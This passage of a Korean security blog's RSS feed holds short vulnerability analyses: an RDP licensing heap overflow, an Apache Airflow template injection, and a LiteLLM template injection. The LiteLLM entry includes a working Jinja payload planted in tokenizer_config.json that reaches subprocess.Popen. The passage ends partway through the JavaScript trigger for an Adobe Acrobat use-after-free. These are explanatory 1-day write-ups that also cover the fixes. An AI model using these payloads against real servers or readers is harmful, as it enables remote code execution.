<code>dwbytes</code>&#xB294; &#xC544;&#xB798;&#xC758; <code>CDataCoding::SetInputEncDataLen</code>&#xD568;&#xC218;&#xC5D0;&#xC11C; &#xAC12;&#xC774; 21&#xB85C; &#xC124;&#xC815;&#xB41C; &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">CDataCoding::SetInputEncDataLen</span><span class="hljs-params">(CDataCoding *<span class="hljs-keyword">this</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  <span class="hljs-comment">// ...</span>  dword_1800D61D0 = <span class="hljs-number">35</span>;  v1 = log10_0((<span class="hljs-keyword">double</span>)dword_1800D61C8) * <span class="hljs-number">35.0</span>;  v2 = v1 / log10_0(<span class="hljs-number">2.0</span>);  v3 = (<span class="hljs-keyword">int</span>)v2 + <span class="hljs-number">1</span>;  v4 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( v2 &lt;= (<span class="hljs-keyword">double</span>)(<span class="hljs-keyword">int</span>)v2 )    v3 = (<span class="hljs-keyword">int</span>)v2;  LOBYTE(v4) = (v3 &amp; <span class="hljs-number">7</span>) != <span class="hljs-number">0</span>;  LODWORD(dwBytes) = (v3 &gt;&gt; <span class="hljs-number">3</span>) + v4; <span class="hljs-comment">// dwBytes is a fixed value 21</span>}</code></pre><p>&#xC774;&#xD6C4; [2]&#xC5D0;&#xC11C; 21 &#xBC14;&#xC774;&#xD2B8; &#xD06C;&#xAE30;&#xC758; &#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xACE0; [3]&#xC758; <code>while</code> &#xB8E8;&#xD504;&#xC5D0;&#xC11C; 24&#xC9C4;&#xC218; &#xC22B;&#xC790;&#xAC00; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB294; <code>a2</code>&#xB97C; 10&#xC9C4;&#xC218;&#xB85C; &#xBCC0;&#xD658;&#xD574;&#xC11C; &#xD560;&#xB2F9;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC81C;&#xACF5;&#xD55C; &#xB370;&#xC774;&#xD130;&#xC778; <code>a2</code>&#xC758; &#xAE38;&#xC774;&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; Heap Overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xACE0; &#xC774;&#xB294; &#xC778;&#xC99D; &#xACFC;&#xC815; &#xC774;&#xC804;&#xC5D0; &#xBC1C;&#xC0DD;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB97C; &#xD1B5;&#xD574; Preauth RCE&#xAC00; &#xAC00;&#xB2A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/heap-buffer-overflow/">heap buffer overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/RDP/">RDP</category>
      
      <category domain="https://hackyboiz.github.io/tags/MadLicense/">MadLicense</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/14/pwndorei/2024-08-14/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-39877: Apache Airflow RCE 취약점</title>
      <link>https://hackyboiz.github.io/2024/08/10/l0ch/2024-08-10/</link>
      <guid>https://hackyboiz.github.io/2024/08/10/l0ch/2024-08-10/</guid>
      <pubDate>Sat, 10 Aug 2024 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.securelayer7.net/arbitrary-code-execution-in</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.securelayer7.net/arbitrary-code-execution-in-apache-airflow/">https://blog.securelayer7.net/arbitrary-code-execution-in-apache-airflow/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache Airflow 2.4.0 ~ 2.9.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>workflow &#xC791;&#xC131;, &#xC2A4;&#xCF00;&#xC904;&#xB9C1; &#xBC0F; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xD50C;&#xB7AB;&#xD3FC;&#xC778; Apache Airflow&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; SSTI &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Apache Airflow&#xB294; &#xAD00;&#xACC4;&#xC131; &#xBC0F; &#xC758;&#xC874;&#xC131;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xC791;&#xC5C5; &#xCEEC;&#xB809;&#xC158;&#xC744; DAG(Directed Acyclic Graph) &#xADF8;&#xB798;&#xD504;&#xB85C; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/10/l0ch/2024-08-10/image1.png" alt="image.png"></p><p>DAG&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; python &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C; &#xC815;&#xC758;&#xB418;&#xBA70;, &#xC720;&#xC800;&#xAC00; DAG&#xB97C; &#xC124;&#xBA85;&#xD558;&#xB294; <a href="https://www.astronomer.io/docs/learn/custom-airflow-ui-docs-tutorial?tab=TaskFlowAPI#step-2-create-a-new-dag">markdown &#xBB38;&#xC11C;</a>&#xB97C; &#xCD94;&#xAC00;&#xD560;&#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. markdown &#xBB38;&#xC11C;&#xB294; DAG&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xC5D0;&#xC11C; Airflow &#xC6F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0; &#xB80C;&#xB354;&#xB9C1;&#xB418;&#xC5B4; &#xCD9C;&#xB825;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC720;&#xC800;&#xAC00; &#xCD94;&#xAC00;&#xD55C; markdown&#xC744; Airflow &#xC6F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0; &#xB80C;&#xB354;&#xB9C1;&#xD560;&#xB54C; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>get_doc_md</code> &#xBA54;&#xC11C;&#xB4DC;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_doc_md</span>(<span class="hljs-params">self, doc_md: str | None</span>) -&gt; str | <span class="hljs-keyword">None</span>:</span>    <span class="hljs-keyword">if</span> doc_md <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:        <span class="hljs-keyword">return</span> doc_md    env = self.get_template_env(force_sandboxed=<span class="hljs-literal">True</span>)    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> doc_md.endswith(<span class="hljs-string">&quot;.md&quot;</span>):        template = jinja2.Template(doc_md)    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">try</span>:            template = env.get_template(doc_md)        <span class="hljs-keyword">except</span> jinja2.exceptions.TemplateNotFound:            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;&quot;&quot;</span><span class="hljs-string">            # Templating Error!</span><span class="hljs-string">            Not able to find the template file: `<span class="hljs-subst">{doc_md}</span>`.</span><span class="hljs-string">            &quot;&quot;&quot;</span>    <span class="hljs-keyword">return</span> template.render()</code></pre><p>&#xD574;&#xB2F9; &#xBA54;&#xC11C;&#xB4DC;&#xB294; <code>doc_md</code> &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294; markdown &#xBB38;&#xC11C;&#xB97C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. <code>doc_md</code> &#xD655;&#xC7A5;&#xBA85;&#xC774; <code>.md</code> &#xB85C; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; python&#xC758; &#xC6F9; &#xD15C;&#xD50C;&#xB9BF; &#xC5D4;&#xC9C4;&#xC778; <code>jinja2</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD15C;&#xD50C;&#xB9BF;&#xC744; &#xB9CC;&#xB4E4;&#xACE0;, <code>template.render()</code>&#xB97C; &#xD1B5;&#xD574; &#xB80C;&#xB354;&#xB9C1;&#xD55C; &#xACB0;&#xACFC;&#xB97C; &#xB9AC;&#xD134;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC774; &#xB54C; <code>doc_md</code>&#xC5D0; markdown &#xBB38;&#xBC95; &#xB300;&#xC2E0; &#xC784;&#xC758;&#xC758; jinja2 expression &#xB610;&#xB294; python &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xBA74; &#xB80C;&#xB354;&#xB9C1; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC5B4;&#xB5A0;&#xD55C; &#xAC80;&#xC99D;&#xB3C4; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; <code>template.render()</code>&#xC758; &#xB80C;&#xB354;&#xB9C1; &#xACFC;&#xC815;&#xC5D0;&#xC11C; SSTI&#xB97C; &#xD1B5;&#xD55C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/10/l0ch/2024-08-10/image2.png" alt="image.png"></p><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58;&#xB294; <code>doc_md</code>&#xB97C; raw data&#xB85C; &#xC77D;&#xB294; &#xAC83;&#xC73C;&#xB85C; makrdown &#xB0B4; &#xD3EC;&#xD568;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xB80C;&#xB354;&#xB9C1;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/SSTI/">SSTI</category>
      
      <category domain="https://hackyboiz.github.io/tags/l0ch/">l0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/Apache-Airflow/">Apache Airflow</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/10/l0ch/2024-08-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-2952: LiteLLM의 SSTI 취약점</title>
      <link>https://hackyboiz.github.io/2024/08/07/ogu123/cve-2024-2952/</link>
      <guid>https://hackyboiz.github.io/2024/08/07/ogu123/cve-2024-2952/</guid>
      <pubDate>Wed, 07 Aug 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.huntr.com/server-side-template-injection-con</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.huntr.com/server-side-template-injection-contributor-blog">https://blog.huntr.com/server-side-template-injection-contributor-blog</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>LiteLLM &lt; 1.34.42</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB2E4;&#xC591;&#xD55C; LLM API&#xB97C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0; &#xD1B5;&#xD569;&#xD558;&#xB294; LiteLLM &#xC194;&#xB8E8;&#xC158;&#xC5D0;&#xC11C; SSTI &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>hf_chat_template</code> &#xBA54;&#xC18C;&#xB4DC;&#xC5D0;&#xC11C; <code>from_string</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD15C;&#xD50C;&#xB9BF;&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs reasonml">def hf<span class="hljs-constructor">_chat_template(<span class="hljs-params">model</span>: <span class="hljs-params">str</span>, <span class="hljs-params">messages</span>: <span class="hljs-params">list</span>, <span class="hljs-params">chat_template</span>: Optional[Any] = None)</span>:    #<span class="hljs-operator"> ... </span>more code    env = <span class="hljs-constructor">Environment()</span>    env.globals<span class="hljs-literal">[&quot;<span class="hljs-identifier">raise_exception</span>&quot;]</span> = raise_exception    <span class="hljs-keyword">try</span>:        template = env.from<span class="hljs-constructor">_string(<span class="hljs-params">chat_template</span>)</span>    except Exception <span class="hljs-keyword">as</span> e:        raise e</code></pre><p><code>hf_chat_template</code> &#xBA54;&#xC18C;&#xB4DC;&#xB294; Hugging Face &#xBAA8;&#xB378;&#xC758; <code>tokenizer_config.json</code> &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC628; <code>chat_template</code> &#xB9E4;&#xAC1C;&#xBCC0;&#xC218; &#xD1B5;&#xD574; Jinja &#xD15C;&#xD50C;&#xB9BF;&#xB97C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C;, <code>chat_template</code> &#xAC12;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xADF8;&#xB300;&#xB85C; &#xC0AC;&#xC6A9;&#xD574; SSTI &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC784;&#xC758;&#xC758; Hugging Face &#xBAA8;&#xB378;&#xC5D0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>tokenizer_config.json</code> &#xD30C;&#xC77C;&#xC744; &#xD3EC;&#xD568;&#xC2DC;&#xCF1C; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs twig"><span class="xml">{</span><span class="xml">  &quot;bos_token&quot;:&quot;&quot;,</span><span class="xml">  &quot;eos_token&quot;:&quot;&quot;,</span><span class="xml">  &quot;chat_template&quot;:&quot;</span><span class="hljs-template-tag">{% <span class="hljs-name"><span class="hljs-keyword">set</span></span> ci = namespace(i=0) %}</span><span class="hljs-template-tag">{% <span class="hljs-name"><span class="hljs-keyword">for</span></span> c in ().__class__.__base__.__subclasses__()%}</span><span class="hljs-template-tag">{% <span class="hljs-name"><span class="hljs-keyword">set</span></span> ci.i =ci.i+ 1 %}</span><span class="hljs-template-tag">{% <span class="hljs-name"><span class="hljs-keyword">if</span></span> c.__name__==&apos;Popen&apos; %}</span><span class="hljs-template-variable">{{ci.i}}</span><span class="hljs-template-tag">{% <span class="hljs-name"><span class="hljs-keyword">endif</span></span> %}</span><span class="hljs-template-tag">{% <span class="hljs-name"><span class="hljs-keyword">endfor</span></span> %}</span><span class="xml">&quot;</span><span class="xml">}</span></code></pre><p>Hugging Face&#xC5D0; &#xBAA8;&#xB378;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0;, &#xC704; <code>tokenizer_config.json</code> &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xD15C;&#xD50C;&#xB9BF;&#xC740; <code>subprocess.Popen</code> &#xD074;&#xB798;&#xC2A4;&#xC758; &#xC778;&#xB371;&#xC2A4;&#xB97C; &#xCC3E;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, <code>bos_token</code>&#xACFC; <code>eos_token</code> &#xAC12;&#xC740; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xD750;&#xB984;&#xC744; &#xBC29;&#xD574;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs rust">curl -X <span class="hljs-symbol">&apos;POST</span>&apos; \  <span class="hljs-symbol">&apos;http</span>:<span class="hljs-comment">//localhost:8000/completions&apos; \</span>  -H <span class="hljs-symbol">&apos;accept</span>: application/json&apos; \  -d &apos;{<span class="hljs-string">&quot;model&quot;</span>:<span class="hljs-string">&quot;huggingface/&lt;user_name&gt;/&lt;model_name&gt;&quot;</span>,<span class="hljs-string">&quot;prompt&quot;</span>:<span class="hljs-string">&quot;hi&quot;</span>}&apos;</code></pre><p><code>/completions</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB85C; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74; <code>hf_chat_template</code> &#xBA54;&#xC11C;&#xB4DC;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; <code>Popen</code> &#xD074;&#xB798;&#xC2A4;&#xC758; &#xC778;&#xB371;&#xC2A4; &#xBC88;&#xD638;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs markdown">{  &quot;bos<span class="hljs-emphasis">_token&quot;:&quot;&quot;,</span><span class="hljs-emphasis">  &quot;eos_</span>token&quot;:&quot;&quot;,  &quot;chat<span class="hljs-emphasis">_template&quot;:&quot;{{().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">389</span>](<span class="hljs-link">[&apos;touch&apos;,&apos;/tmp/1337&apos;]</span>)}}&quot;</span><span class="hljs-emphasis">}</span></code></pre><p>&#xC778;&#xB371;&#xC2A4; &#xBC88;&#xD638;&#xB97C; &#xD655;&#xC778;&#xD55C; &#xD6C4;, <code>tokenizer_config.json</code> &#xD30C;&#xC77C;&#xC744; &#xC704;&#xC640; &#xAC19;&#xC774; &#xC218;&#xC815;&#xD574; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>Popen</code> &#xD074;&#xB798;&#xC2A4;&#xC758; &#xC778;&#xB371;&#xC2A4; &#xBC88;&#xD638;&#xB294; &#xC11C;&#xBC84; &#xD658;&#xACBD;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB97C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xAC01; &#xC11C;&#xBC84; &#xD658;&#xACBD;&#xC5D0; &#xB9DE;&#xAC8C; &#xC778;&#xB371;&#xC2A4; &#xBC88;&#xD638;&#xB97C; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/07/ogu123/cve-2024-2952/image1.png" alt></p><p>touch &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; <code>/tmp/1337</code> &#xD30C;&#xC77C;&#xC774; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/07/ogu123/cve-2024-2952/image2.png" alt></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Jinja &#xD15C;&#xD50C;&#xB9BF;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xD658;&#xACBD;&#xC744; <code>Environment</code>&#xC5D0;&#xC11C; <code>ImmutableSandboxedEnvironment</code>&#xB85C; &#xBCC0;&#xACBD;&#xD574; &#xD0EC;&#xD50C;&#xB9BF; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD55C; &#xCF54;&#xB4DC; &#xBC94;&#xC704;&#xB97C; &#xC81C;&#xD55C;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/advisories/GHSA-46cm-pfwv-cgf8">https://github.com/advisories/GHSA-46cm-pfwv-cgf8</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/SSTI/">SSTI</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/LiteLLM/">LiteLLM</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/07/ogu123/cve-2024-2952/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 1day1document : CVE-2023-21608</title>
      <link>https://hackyboiz.github.io/2024/08/04/pwndorei/1day1document_CVE-2023-21608/</link>
      <guid>https://hackyboiz.github.io/2024/08/04/pwndorei/1day1document_CVE-2023-21608/</guid>
      <pubDate>Sun, 04 Aug 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Init&quot;&gt;&lt;a href=&quot;#Init&quot; class=&quot;headerlink&quot; title=&quot;Init&quot;&gt;&lt;/a&gt;Init&lt;/h1&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! pwndorei&amp;#xC785;&amp;#xB</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Init"><a href="#Init" class="headerlink" title="Init"></a>Init</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! pwndorei&#xC785;&#xB2C8;&#xB2E4;. &#xC624;&#xB298;&#xC740; &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xC5F0;&#xAD6C;&#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xC81C;&#xBAA9;&#xCC98;&#xB7FC; CVE-2023-21608&#xC758; &#xBD84;&#xC11D; &#xBC0F; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xACFC;&#xC815;&#xC744; &#xB2E4;&#xB8F0; &#xAC83;&#xC774;&#xACE0; &#xD558;&#xB8E8;&#xD55C;&#xC904;&#xC5D0; &#xC880; &#xBD80;&#xC871;&#xD568;&#xC744; &#xB290;&#xB07C;&#xC168;&#xC744; &#xBD84;&#xB4E4;&#xC744; &#xC704;&#xD55C; &#xD558;&#xB8E8; &#xD55C; &#xBB38;&#xC11C;&#xCBE4; &#xB418;&#xB294; &#xBD84;&#xB7C9;&#xC785;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;&#x314B;</p><p><img src="/2024/08/04/pwndorei/1day1document_CVE-2023-21608/8yf1gt.gif" alt="8yf1gt.gif"></p><h1 id="1-&#xCDE8;&#xC57D;&#xC810;-&#xC815;&#xBCF4;"><a href="#1-&#xCDE8;&#xC57D;&#xC810;-&#xC815;&#xBCF4;" class="headerlink" title="1. &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4;"></a>1. &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4;</h1><hr><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>CVE-2023-21608&#xC740; Adobe &#xC0AC;&#xC758; PDF &#xBB38;&#xC11C; &#xD3B8;&#xC9D1;, &#xBCC0;&#xD658; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC778; Acrobat&#xACFC; PDF &#xBDF0;&#xC5B4;&#xC778; Acrobat Reader &#xC81C;&#xD488;&#xAD70;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; Use-After-Free &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xC758; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB4E4;&#xC5D0;&#xC11C; &#xC545;&#xC131; PDF &#xBB38;&#xC11C;&#xB97C; &#xC5F4;&#xBA74; &#xBB38;&#xC11C;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; Javascript &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74;&#xC11C; Use-After-Free&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xACE0; &#xC774;&#xB97C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xD558;&#xC5EC; Remote Code Execution&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Affected-Product-amp-Version-Information"><a href="#Affected-Product-amp-Version-Information" class="headerlink" title="Affected Product &amp; Version Information"></a>Affected Product &amp; Version Information</h2><ul><li>Adobe Acrobat 2020<ul><li>version &#x2264; 20.005.30418</li></ul></li><li>Adobe Acrobat Reader 2020<ul><li>version &#x2264; 20.005.30418</li></ul></li><li>Acrobat DC<ul><li>version &#x2264; 22.003.20282</li></ul></li><li>Acrobat Reader DC<ul><li>version &#x2264;  22.003.20282</li></ul></li></ul><p>&#xC81C; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xBD84;&#xC11D;&#xACFC; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC704;&#xD574; Adobe Acrobat Reader DC x86&#xC758; 2022.001.20085 &#xBC84;&#xC804;&#xC744; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h1 id="2-&#xCDE8;&#xC57D;&#xC810;-&#xBD84;&#xC11D;"><a href="#2-&#xCDE8;&#xC57D;&#xC810;-&#xBD84;&#xC11D;" class="headerlink" title="2. &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;"></a>2. &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;</h1><hr><p>&#xBA3C;&#xC800; &#xC544;&#xB798;&#xB294; Use-After-Free&#xB97C; &#xC720;&#xBC1C;&#xD558;&#xC5EC; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB41C; Javascript &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-keyword">var</span> testField = <span class="hljs-built_in">this</span>.getField(<span class="hljs-string">&quot;testField&quot;</span>);testField.richText = <span class="hljs-literal">true</span>;testField.setAction(<span class="hljs-string">&quot;Calculate&quot;</span>, <span class="hljs-string">&quot;calculateCallback()&quot;</span>);<span class="hljs-keyword">try</span> { <span class="hljs-built_in">this</span>.resetForm(); } <span class="hljs-keyword">catch</span> (e) {}<span class="hljs-keyword">try</span> { <span class="hljs-built_in">this</span>.resetForm(); } <span class="hljs-keyword">catch</span> (e) {}  <span class="hljs-comment">// bug is triggered during this resetForm call</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span 